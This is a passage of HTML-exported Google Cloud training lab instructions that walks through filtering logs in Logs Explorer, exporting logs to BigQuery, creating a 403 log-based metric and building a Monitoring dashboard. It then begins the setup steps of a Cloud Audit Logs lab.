filtering.</span></p><h4 id='see-which-services-are-writing-logs'><span>See which services are writing logs</span></h4><ol start='' ><li><p><span>Ensure that you are on the Google Cloud Console homepage.</span></p></li><li><p><span>Verify you are still working in project 1; the project ID in the Console&#39;s info panel should match </span><strong><span>Project ID 1</span></strong><span> in your lab&#39;s connection details panel.</span></p></li><li><p><span>View Cloud Logging by opening </span><strong><span>Navigation menu &gt; Logging &gt; Logs Explorer</span></strong><span>. If prompted, close the notification.</span></p></li><li><p><span>On the left-hand panel, </span><strong><span>Log fields</span></strong><span> will be visible. Under </span><strong><span>Resource Type</span></strong><span>, you will see several Google Cloud services that are creating logs.</span></p></li></ol><p><span>All of these services are writing log entries. Entries from all these logs appear on the right, in the Query results pane. You can also query for results from specific logs, or that match specific criteria.</span></p><h6 id='view-vm-instance-logs-with-simple-filtering'><span>View VM instance logs with simple filtering</span></h6><ol start='' ><li><p><span>In the </span><strong><span>Log fields</span></strong><span> panel, under </span><strong><span>Resource Type</span></strong><span>, click </span><strong><span>VM Instance</span></strong><span>.</span></p></li></ol><p><span>After you click this:</span></p><ul><li><p><span>The contents of the Log fields panel changes. You will see a new field named </span><code>INSTANCE ID</code><span>. It shows all the instance IDs of the VM instances that are writing log entries.</span></p></li><li><p><span>The Query box near the top of the page is populated with </span><code>resource.type=&quot;gce_instance&quot;</code><span>. This means that only entries from VM instances will be logged and displayed.</span></p></li><li><p><span>The Query results pane also updates automatically—entries from VM Instances are the only logs displayed.</span></p></li></ul><ol start='' ><li><p><span>In the </span><strong><span>Instance Id</span></strong><span> field, select one of the instance IDs. Logs for the associated VM instance appear in the Query results pane.</span></p></li><li><p><span>Click inside the </span><strong><span>Query</span></strong><span> box. This now becomes editable.</span></p></li><li><p><span>In the </span><strong><span>Query</span></strong><span> box, remove everything after line 1. You should see only line 1, which contains </span><code>resource.type=&quot;gce_instance&quot;</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Run query</span></strong><span> (located in the top-right corner). In the Query results, you should see entries from all VM instance logs.</span></p></li><li><p><span>Note that the logs panel reverts to its previous state.</span></p></li><li><p><span>Turn on streaming logs by clicking </span><strong><span>Stream logs</span></strong><span> (top-right corner, above the &quot;Run query&quot; button).</span></p></li><li><p><span>You should see new log entries showing up every 1-2 seconds as the background activity is generating unauthorized requests against your Web servers.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You might need to click </span><strong><span>Restart streaming</span></strong><span> if it pauses.</span></p><p><span>You will now view overall web activity on any Linux Apache server.</span></p><ol start='' ><li><p><span>Stop log streaming by clicking on </span><strong><span>Stop stream</span></strong><span> in the top-right corner.</span></p></li><li><p><span>Now click on the </span><strong><span>All Log Names</span></strong><span> dropdown, and select </span><strong><span>syslog</span></strong><span>, and then click </span><strong><span>Apply</span></strong><span>.</span></p></li></ol><p><span>Entries from syslog appear in the Query results pane.</span></p><p><strong><span>Note:</span></strong><span> You can also control log entry displays by selecting the log severity and time windows.</span></p><h4 id='task-3-use-log-exports'><span>Task 3. Use log exports</span></h4><p><span>In this task, you configure and test log exports to BigQuery.</span></p><p><span>Cloud Logging retains log entries for 30 days. In most circumstances, you&#39;ll want to retain some log entries for an extended time (and possibly perform sophisticated reporting on the archived logs).</span></p><p><span>Google Cloud provides a mechanism to have all log entries ingested into Cloud Monitoring also written to one or more archival </span><code>sinks</code><span>.</span></p><h5 id='configure-the-export-to-bigquery'><span>Configure the export to BigQuery</span></h5><ol start='' ><li><p><span>Go to Cloud Logging Exports (</span><strong><span>Navigation menu &gt; Logging &gt; Log Router</span></strong><span>).</span></p></li><li><p><span>Click </span><strong><span>Create Sink</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Sink name</span></strong><span>, type </span><code>vm_logs</code><span> and then click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Select sink service</span></strong><span>, select </span><strong><span>BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Select BigQuery dataset</span></strong><span>, select </span><strong><span>Create new BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Dataset ID</span></strong><span>, type </span><code>project_logs</code><span>, and click </span><strong><span>Create Dataset</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Build inclusion filter</span></strong><span> list box, copy and paste </span><code>resource.type=&quot;gce_instance&quot;</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Sink</span></strong><span>. You will now return to a Log Router </span><em><span>Create log sink next steps</span></em><span> page (a message at the top may appear that says &quot;Your log sink was successfully created. Data should be available soon.&quot;)</span></p></li></ol><p><strong><span>Note:</span></strong><span> You could also export log entries to Pub/Sub or Cloud Storage.</span></p><p>&nbsp;</p><p><span>Exporting to Pub/Sub can be useful if you want to flow through an ETL process prior to storing in a database (</span><code>Monitoring **&gt;** Pub/Sub **&gt;** Dataflow **&gt;** BigQuery/Bigtable</code><span>).</span></p><p>&nbsp;</p><p><span>Exporting to Cloud Storage will batch up entries and write them into Cloud Storage objects approximately every hour.</span></p><h5 id='configure-http-load-balancing-exports-to-bigquery'><span>Configure HTTP load balancing exports to BigQuery</span></h5><p><span>You will now create an export for the </span><strong><span>HTTP load balancing</span></strong><span> logs to BigQuery.</span></p><ol start='' ><li><p><span>From the left-hand navigation menu, select </span><strong><span>Log Router</span></strong><span> to return to the service homepage.</span></p></li><li><p><span>Click </span><strong><span>Create Sink</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Sink name</span></strong><span>, type </span><code>load_bal_logs</code><span> and then click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Select sink service</span></strong><span>, select </span><strong><span>BigQuery dataset</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Select BigQuery dataset</span></strong><span>, select </span><strong><span>project_logs</span></strong><span>. (You created this BigQuery dataset in the previous set of steps.)</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Build inclusion filter</span></strong><span> list box, copy and paste </span><code>resource.type=&quot;http_load_balancer&quot;</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Sink</span></strong><span>.</span></p></li><li><p><span>You will now be on the </span><em><span>Create log sink next steps</span></em><span> page for the log sink.</span></p></li><li><p><span>From the left-hand navigation menu, select </span><strong><span>Log Router</span></strong><span> to return to the service homepage.</span></p></li></ol><p><span>The Log Router page appears, displaying a list of sinks (including the one you just created—</span><code>load_bal_logs</code><span>).</span></p><h5 id='investigate-the-exported-log-entries'><span>Investigate the exported log entries</span></h5><ol start='' ><li><p><span>Open BigQuery (</span><strong><span>Navigation menu &gt; BigQuery</span></strong><span>).</span></p></li><li><p><span>The &quot;Welcome to BigQuery in the Cloud Console&quot; message box opens. This message box provides a link to the quickstart guide and lists UI updates.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>In the left pane in the Explorer section, click the arrow next to your project (this starts with </span><code>qwiklabs-gcp-xxx</code><span>) and you should see a </span><code>project_logs</code><span> dataset revealed under it.</span></p></li></ol><p><span>You will now verify that the BigQuery dataset has appropriate permissions to allow the export writer to store log entries.</span></p><ol start='' ><li><p><span>Click on the three dotted menu item (&quot;View actions&quot;) next to the </span><code>project_logs</code><span> dataset and click </span><strong><span>Open</span></strong><span>.</span></p></li><li><p><span>Then from the top-right hand corner of the Console, click the </span><strong><span>Sharing</span></strong><span> dropdown and select </span><strong><span>Permissions</span></strong><span>.</span></p></li><li><p><span>On the Dataset permission page, you will see that your service accounts have the &quot;BigQuery Data Editor&quot; role.</span></p></li><li><p><span>Close the dataset permissions panel.</span></p></li><li><p><span>Expand the </span><code>project_logs</code><span> dataset to see the tables with your exported logs—you should see multiple tables (one for each type of log that&#39;s receiving entries).</span></p></li><li><p><span>Click on the </span><strong><span>syslog_(1)</span></strong><span> table, then click </span><strong><span>Details</span></strong><span> to see the number of rows and other metadata. If the </span><strong><span>syslog_(1)</span></strong><span> table is not visible, try refreshing the browser.</span></p></li><li><p><span>In </span><strong><span>Details</span></strong><span> tab, under the table info you will see the full table name in the </span><strong><span>Table ID</span></strong><span>, copy this table name.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Because the log entries are being streamed into BigQuery as they arrive to Cloud Monitoring, they are stored in a BigQuery streaming buffer. Roughly 24 hours after arriving in the buffer, they will be moved into regular BigQuery storage. You can perform queries against the table and both the data in regular storage and the buffer will be scanned.</span></p><ol start='' ><li><p><span>To see a subset of your tables fields, paste the below query in the query editor tab (replacing </span><code>qwiklabs-gcp-xx.project_logs.syslog_xxxxx</code><span> with the table name you copied in the previous step).</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  logName, resource.type, resource.labels.zone, resource.labels.project_id,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `qwiklabs-gcp-xx.project_logs.syslog_xxxxx`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Then click </span><strong><span>Run</span></strong><span>.</span></p></li></ol><p><span>Feel free to experiment with some other queries that might provide interesting insights.</span></p><p><strong><span>Note:</span></strong><span> Cloud Logging exports incoming log entries before any decision is made about ingesting the entry into logging storage. As a result, only new log entries will be exported to the sink. As a result, you may not see a </span><code>syslog_(1)</code><span> table as all the syslog entries were generated prior to the export.</span></p><p>&nbsp;</p><p><span>Existing log entries already ingested into Cloud Logging can be extracted using commands like:</span></p><p>&nbsp;</p><p><code>gcloud logging read &quot;resource.type=gce_instance AND logName=projects/[PROJECT_ID]/logs/syslog AND textPayload:SyncAddress&quot; --limit 10 --format json</code><span>.</span></p><p><strong><span>Note:</span></strong><span> You have set up an export for all the log entries generated by all services in the project. You can also create aggregate exports, which export log entries generated across projects, grouped by billing account, folder, or organization.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure the export to BigQuery</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-create-a-logging-metric'><span>Task 4. Create a logging metric</span></h4><p><span>In this task, you create a metric that you can use to generate alerts if too many web requests generate access denied log entries.</span></p><p><span>Cloud Monitoring allows you to create custom metrics based on the arrival of specific log entries.</span></p><ol start='' ><li><p><span>Go back to the Logs Explorer page (</span><strong><span>Navigation menu &gt; Logging &gt; Logs Explorer</span></strong><span>).</span></p></li></ol><p><strong><span>Note:</span></strong><span> If prompted, click </span><strong><span>Leave</span></strong><span> for unsaved work.</span></p><ol start='' ><li><p><span>Select </span><strong><span>Create Metric</span></strong><span> from </span><strong><span>Actions</span></strong><span> dropdown (right-hand side of the Console) to create a logging metric based on this filter.</span></p></li><li><p><span>In the Log-based metric Editor, set </span><strong><span>Metric Type</span></strong><span> as </span><strong><span>Counter</span></strong><span>.</span></p></li><li><p><span>Under the </span><strong><span>Details</span></strong><span> section, set the </span><strong><span>Log-based metric name</span></strong><span> to </span><strong><span>403s</span></strong><span>.</span></p></li><li><p><span>Under the </span><strong><span>Filter selection</span></strong><span> for </span><strong><span>Build filter</span></strong><span>, enter the following and replace </span><code>PROJECT_ID</code><span> with </span><strong><span>Project ID 1</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type="gce_instance"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">log_name="projects/PROJECT_ID/logs/syslog"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Leave all the other fields at their default.</span></p></li><li><p><span>Click </span><strong><span>Create Metric</span></strong><span>.</span></p></li><li><p><span>You will make use of this metric in the dashboarding portion of the lab.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a logging metric</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-create-a-monitoring-dashboard'><span>Task 5. Create a monitoring dashboard</span></h4><p><span>In this task, you switch to the second project created by Qwiklabs and setup a Monitoring workspace.</span></p><h5 id='switch-projects'><span>Switch projects</span></h5><ol start='' ><li><p><span>Switch to the second project created by Qwiklabs (use the </span><strong><span>Project ID 2</span></strong><span> from the Qwiklabs Connection Details). The current project ID is displayed at the top of the console.</span></p></li></ol><p><img src="https://cdn.qwiklabs.com/hMaK8sTDLPIpOww01F7%2Brr%2F6JnoaFR6ijZs2Jvj5vOw%3D" referrerpolicy="no-referrer" alt="GCP project identifier"></p><ol start='' ><li><p><span>Click the project name at the top of the Cloud Console and click the </span><strong><span>All</span></strong><span> tab.</span></p></li></ol><p><img src="images\obzf4XQJAOwh8xAEBtPHaWm66eoLYAY5ltoFqqQiZ3c%3D" referrerpolicy="no-referrer" alt="Google Cloud all projects tab"></p><ol start='' ><li><p><span>Click the second project you want to switch to. Verify it is the </span><strong><span>Project ID 2</span></strong><span> from the Qwiklabs Connection Details.</span></p></li><li><p><span>Click </span><strong><span>Open</span></strong><span>.</span></p></li></ol><h5 id='create-a-monitoring-workspace'><span>Create a Monitoring workspace</span></h5><p><span>You will now setup a Monitoring workspace that&#39;s tied to your Google Cloud Project. The following steps create a new account that has a free trial of Monitoring.</span></p><ol start='' ><li><p><span>In the Cloud Console, click on </span><strong><span>Navigation menu &gt; Monitoring</span></strong><span>.</span></p></li><li><p><span>Wait for your workspace to be provisioned.</span></p></li></ol><p><span>When the Monitoring dashboard opens, your workspace is ready.</span></p><p><img src="images\Tv6EOQEJQfXaWXfTpUKfaA%2FvAp5xwzJl1ss5SGnmsv0%3D" referrerpolicy="no-referrer" alt="Cloud Monitoring Dashboard"></p><p><span>Now add the first project to your Cloud Monitoring workspace.</span></p><ol start='' ><li><p><span>In the left menu, click </span><strong><span>Settings</span></strong><span>, then click </span><strong><span>Metric Scope</span></strong><span> and click </span><strong><span>+ Add Projects</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Select Projects</span></strong></p></li><li><p><span>Select the checkmark next to your first project ID and click </span><strong><span>Select</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Projects</span></strong><span>.</span></p></li></ol><h5 id='create-a-monitoring-dashboard'><span>Create a monitoring dashboard</span></h5><ol start='' ><li><p><span>In the left pane, click </span><strong><span>Dashboards</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Create Dashboard</span></strong><span>.</span></p></li><li><p><span>Replace the generic dashboard name at the top with </span><code>Example Dashboard</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Widget</span></strong><span> &gt; </span><strong><span>Line</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Widget Title</span></strong><span>, enter in </span><strong><span>CPU Usage</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Metric</span></strong><span> dropdown.</span></p></li><li><p><span>Click </span><strong><span>Active</span></strong><span> to deselect it. The tick should disappear.</span></p></li><li><p><span>For </span><strong><span>Metric</span></strong><span>, select </span><strong><span>VM Instance &gt; Instance &gt; CPU usage</span></strong><span>. Make sure it&#39;s the one that follows the format: </span><code>compute.googleapis.com/instance/cpu/usage_time</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Now click </span><strong><span>Apply</span></strong><span> in the top-right corner.</span></p></li><li><p><span>Click </span><strong><span>Add Widget</span></strong><span> &gt; </span><strong><span>Line</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Widget Title</span></strong><span>, enter in </span><strong><span>Memory Utilization</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Metric</span></strong><span> dropdown.</span></p></li><li><p><span>Click </span><strong><span>Active</span></strong><span> to deselect it. The tick should disappear.</span></p></li><li><p><span>For </span><strong><span>Metric</span></strong><span>, select </span><strong><span>VM Instance &gt; Memory &gt; Memory Utilization</span></strong><span>. Make sure it&#39;s the one that follows the format: </span><code>agent.googleapis.com/memory/percent_used</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Now click </span><strong><span>Apply</span></strong><span> in the top-right corner.</span></p></li></ol><p><span>You should now see your two graphs—one for CPU usage and the other for memory utilization—populated.</span></p><p><img src="images\XFLxoosE2QP83OL8%2Ftis0n%2BAEvrVo6SUhlpmDVa7ZXY%3D" referrerpolicy="no-referrer" alt="CPU usage and netowrk traffic graphs in the monitoring dashboard"></p><p><span>You can now explore some other options by editing the charts such as Filter, Group By, and Aggregation.</span></p><h4 id='congratulations-19'><span>Congratulations!</span></h4><p><span>In this lab, you learned how to do the following:</span></p><ol start='' ><li><p><span>View logs using a variety of filtering mechanisms.</span></p></li><li><p><span>Exclude log entries and disable log ingestion.</span></p></li><li><p><span>Export logs and run reports against exported logs.</span></p></li><li><p><span>Create and report on logging metrics.</span></p></li><li><p><span>Use Cloud Monitoring to monitor different Google Cloud projects.</span></p></li><li><p><span>Create a metrics dashboard.</span></p></li></ol><p>&nbsp;</p><h3 id='lab---configuring-and-viewing-cloud-audit-logs'><span>LAB - Configuring and Viewing Cloud Audit Logs</span></h3><h4 id='overview-23'><span>Overview</span></h4><p><span>In this lab, you will investigate </span><a href='https://cloud.google.com/logging/docs/audit'><span>Cloud Audit Logs</span></a><span>. Cloud Audit Logs maintains two audit logs for each project and organization: Admin Activity and Data Access.</span></p><p><span>Google Cloud services write audit log entries to these logs to help you answer the questions of &quot;who did what, where, and when&quot; within your Google Cloud projects.</span></p><h4 id='objectives-20'><span>Objectives</span></h4><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>View audit logs in the Activity page.</span></p></li><li><p><span>View and filter audit logs in Cloud Logging.</span></p></li><li><p><span>Retrieve log entries with gcloud.</span></p></li><li><p><span>Export audit logs.</span></p></li></ul><h5 id='setup-and-requirements-20'><span>Setup and requirements</span></h5><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h5 id='activate-google-cloud-shell-10'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="images\WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images\hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div 